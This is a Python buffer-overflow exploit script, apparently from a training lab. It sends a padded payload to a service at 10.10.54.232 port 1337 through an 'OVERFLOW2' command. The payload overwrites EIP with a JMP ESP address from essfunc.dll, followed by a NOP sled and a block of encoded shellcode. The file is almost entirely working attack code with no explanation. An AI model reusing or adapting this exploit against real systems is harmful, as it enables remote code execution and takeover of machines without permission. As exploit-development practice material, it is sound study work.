import socket
import sys
import time


print("[+] Initiating the Crash Now!\n")

buff = "A" * 634
eip = "\xbb\x11\x50\x62" #625011BB JMP ESP from essfunc.dll

nops = "\x90" * 16

shellcode =  b""
shellcode += b"\xfc\xbb\x99\xa4\x99\x7a\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x65\x4c\x1b\x7a\x95\x8d\x7c\xf2"
shellcode += b"\x70\xbc\xbc\x60\xf1\xef\x0c\xe2\x57\x1c\xe6"
shellcode += b"\xa6\x43\x97\x8a\x6e\x64\x10\x20\x49\x4b\xa1"
shellcode += b"\x19\xa9\xca\x21\x60\xfe\x2c\x1b\xab\xf3\x2d"
shellcode += b"\x5c\xd6\xfe\x7f\x35\x9c\xad\x6f\x32\xe8\x6d"
shellcode += b"\x04\x08\xfc\xf5\xf9\xd9\xff\xd4\xac\x52\xa6"
shellcode += b"\xf6\x4f\xb6\xd2\xbe\x57\xdb\xdf\x09\xec\x2f"
shellcode += b"\xab\x8b\x24\x7e\x54\x27\x09\x4e\xa7\x39\x4e"
shellcode += b"\x69\x58\x4c\xa6\x89\xe5\x57\x7d\xf3\x31\xdd"
shellcode += b"\x65\x53\xb1\x45\x41\x65\x16\x13\x02\x69\xd3"
shellcode += b"\x57\x4c\x6e\xe2\xb4\xe7\x8a\x6f\x3b\x27\x1b"
shellcode += b"\x2b\x18\xe3\x47\xef\x01\xb2\x2d\x5e\x3d\xa4"
shellcode += b"\x8d\x3f\x9b\xaf\x20\x2b\x96\xf2\x2c\x98\x9b"
shellcode += b"\x0c\xad\xb6\xac\x7f\x9f\x19\x07\x17\x93\xd2"
shellcode += b"\x81\xe0\xd4\xc8\x76\x7e\x2b\xf3\x86\x57\xe8"
shellcode += b"\xa7\xd6\xcf\xd9\xc7\xbc\x0f\xe5\x1d\x12\x5f"
shellcode += b"\x49\xce\xd3\x0f\x29\xbe\xbb\x45\xa6\xe1\xdc"
shellcode += b"\x66\x6c\x8a\x77\x9d\xe7\xbf\x96\x93\x7b\xd7"
shellcode += b"\x9a\xab\x92\x74\x12\x4d\xfe\x94\x72\xc6\x97"
shellcode += b"\x0d\xdf\x9c\x06\xd1\xf5\xd9\x09\x59\xfa\x1e"
shellcode += b"\xc7\xaa\x77\x0c\xb0\x5a\xc2\x6e\x17\x64\xf8"
shellcode += b"\x06\xfb\xf7\x67\xd6\x72\xe4\x3f\x81\xd3\xda"
shellcode += b"\x49\x47\xce\x45\xe0\x75\x13\x13\xcb\x3d\xc8"
shellcode += b"\xe0\xd2\xbc\x9d\x5d\xf1\xae\x5b\x5d\xbd\x9a"
shellcode += b"\x33\x08\x6b\x74\xf2\xe2\xdd\x2e\xac\x59\xb4"
shellcode += b"\xa6\x29\x92\x07\xb0\x35\xff\xf1\x5c\x87\x56"
shellcode += b"\x44\x63\x28\x3f\x40\x1c\x54\xdf\xaf\xf7\xdc"
shellcode += b"\xff\x4d\xdd\x28\x68\xc8\xb4\x90\xf5\xeb\x63"
shellcode += b"\xd6\x03\x68\x81\xa7\xf7\x70\xe0\xa2\xbc\x36"
shellcode += b"\x19\xdf\xad\xd2\x1d\x4c\xcd\xf6\x1d\x72\x31"
shellcode += b"\xf9"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = buff + eip + nops + shellcode

# Connect to the Application
s.connect(('10.10.54.232', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command PASS
s.send('OVERFLOW2 ' + payload + '\r\n')
s.close()
